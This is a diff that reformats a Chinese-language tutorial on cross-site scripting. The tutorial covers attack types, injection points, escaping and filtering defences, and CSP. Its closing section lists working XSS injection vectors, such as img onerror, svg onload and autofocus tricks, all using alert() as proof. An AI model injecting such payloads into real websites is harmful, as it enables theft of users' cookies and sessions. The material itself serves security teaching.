@@ -1,11 +1,12 @@
-# XSS 跨站脚本攻击
-![xss](img/xss.png) 
+# `XSS 跨站脚本攻击`
+
+![xss](img/xss.png)
 
 XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。
 
 从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。
 
-## XSS攻击的危害包括：
+## `XSS攻击的危害`
 
 1. 获取页面数据
 2. 获取cookie
@@ -16,9 +17,10 @@ XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提
 7. 偷取用户密码和登陆态
 8. 欺骗用户
    
-## XSS攻击分类
+## `XSS攻击分类`
 
-### 反射型
+### `反射型`
+
 通过url参数直接注入。
 
 发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务端解析后返回，XSS代码随响应内容一起传回给浏览器，最后浏览器执行XSS代码。这个过程像一次反射，故叫做反射型XSS。
@@ -29,36 +31,36 @@ XSS ( Cross Site Scripting ) 是指恶意攻击者利用网站没有对用户提
 
 并不是在url中没有包含script标签的网址都是安全的，可以使用[短网址](dwz.com)来让网址变得很短。
 
-
-
-### 存储型
+### `存储型`
 存储型XSS会被保存到数据库，在其他用户访问（前端）到这条数据时，这个代码会在访问用户的浏览器端执行。
 
 **举个例子**
 
 比如攻击者在一篇文章的评论中写入了script标签，这个评论被保存数据库，当其他用户看到这篇文章时就会执行这个脚本。
 
-
-
 ## XSS攻击注入点
+
  - HTML节点内容
    - 如果一个节点内容是动态生成的，而这个内容中包含用户输入。
  - HTML属性
    - 某些节点属性值是由用户输入的内容生成的。那么可能会被封闭标签后添加script标签。
+  
 ```html
 <img src="${image}"/>
 <img src="1" onerror="alert(1)" />
 ```
+
  - Javascript代码
    - JS中包含由后台注入的变量或用户输入的信息。
+
 ```js
 var data = "#{data}";
 var data = "hello"; alert(1);"";
 ```
+
  - 富文本
 
-
-## XSS 防御
+## `XSS 防御`
 
 对于 XSS 攻击来说，通常有两种方式可以用来防御。
  - 转义字符
@@ -82,13 +84,12 @@ var data = "hello"; alert(1);"";
    - 避免直接对HTML Entity解码
    - 使用DOM Parse转换，校正不配对的DOM标签和属性
 
-
-#### 对于会在DOM中出现的字符串（用户数据）：
+#### `对于会在DOM中出现的字符串（用户数据）`
 
  < 转义为 \&lt;
  > 转义为 \&gt;
 
-#### 对于可能出现在DOM元素属性上的数据
+#### `对于可能出现在DOM元素属性上的数据`
 
  " 转义为 \&quot;
  ' 转义为 \&9039;
@@ -96,21 +97,25 @@ var data = "hello"; alert(1);"";
 
  & 这个字符如果要转义，那么一定要放在转移函数的第一个来做
 
-#### 避免JS中的插入
+#### `避免JS中的插入`
+
 ```js
 var data = "#{data}";
 var data = "hello"; alert(1);"";
 ```
+
 因为是用引号将变量包裹起来的，而且被攻击也因为引号被提前结束，所以要做的就是将引号转义
+
 ```
 先 \\ -> \\\\
 再 " -> \\"
 ```
 
-#### 富文本
+#### `富文本`
 
 按照黑名单过滤： script等
-但是html标签中能执行html代码的属性太多了，比如onclick, onhover,onerror, <a href="jacascript:alert(1)">
+但是html标签中能执行html代码的属性太多了，比如onclick, onhover,onerror, `<a href="jacascript:alert(1)">`
+
 ```js
 function xssFilter = function (html) {
   html = html.replace(/<\s*\/?script\s*>/g, '');
@@ -126,6 +131,7 @@ function xssFilter = function (html) {
 做法：将HTML解析成树状结构，对于这个DOM树，一个一个的去看是否存在合法的标签和属性，如果不是就去掉。
 
 使用cheerio就可以快速的解析DOM
+
 ```js
 function xssFilter (html) {
 
@@ -150,9 +156,9 @@ function xssFilter (html) {
 }
 ```
 
-#### 使用npm包来简化操作
-[xss文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
+#### `使用npm包来简化操作`
 
+[xss文档](https://github.com/leizongmin/js-xss/blob/master/README.zh.md)
 
 ### CSP 内容安全策略
 
@@ -178,66 +184,84 @@ Content-Security-Policy: child-src 'none'
 
 [CSP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP) ( Content Security Policy )
 
+## `XSS注入方法`
 
-## XSS注入方法
 参考链接：https://xz.aliyun.com/t/4067
 
 ### `<scirpt>`
 
-    <scirpt>alert("xss");</script>
+```html
+<scirpt>alert("xss");</script>
+```
 
 ### `<img>`
 
-    <img src=1 onerror=alert("xss");>
-
+```html
+<img src=1 onerror=alert("xss");>
+```
 ### `<input>`
 
-    <input onfocus="alert('xss');">
+```html
+<input onfocus="alert('xss');">
 
-    竞争焦点，从而触发onblur事件
-    <input onblur=alert("xss") autofocus><input autofocus>
+竞争焦点，从而触发onblur事件
+<input onblur=alert("xss") autofocus><input autofocus>
 
-    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-    <input onfocus="alert('xss');" autofocus>
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+<input onfocus="alert('xss');" autofocus>
+```
 
 ### `<details>`
 
-    <details ontoggle="alert('xss');">
+```html
+<details ontoggle="alert('xss');">
 
-    使用open属性触发ontoggle事件，无需用户去触发
-    <details open ontoggle="alert('xss');">
+使用open属性触发ontoggle事件，无需用户去触发
+<details open ontoggle="alert('xss');">
+```
 
 ### `<svg>`
 
-    <svg onload=alert("xss");>
+```html
+<svg onload=alert("xss");>
+```
 
 ### `<select>`
 
-    <select onfocus=alert(1)></select>
+```html
+<select onfocus=alert(1)></select>
 
-    通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-    <select onfocus=alert(1) autofocus>
+通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
+<select onfocus=alert(1) autofocus>
+```
 
 ### `<iframe>`
 
-    <iframe onload=alert("xss");></iframe>
+```html
+<iframe onload=alert("xss");></iframe>
+```
 
 ### `<video>`
 
-    <video><source onerror="alert(1)">
+```html
+<video><source onerror="alert(1)">
+```
 
 ### `<audio>`
 
-    <audio src=x  onerror=alert("xss");>
+```html
+<audio src=x  onerror=alert("xss");>
+```
 
 ### `<body>`
 
-    <body/onload=alert("xss");>
+```html
+<body/onload=alert("xss");>
 
 利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发
 
-    <body
-    onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onscroll=alert("xss");><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+```
 
 ### `<textarea>`
 
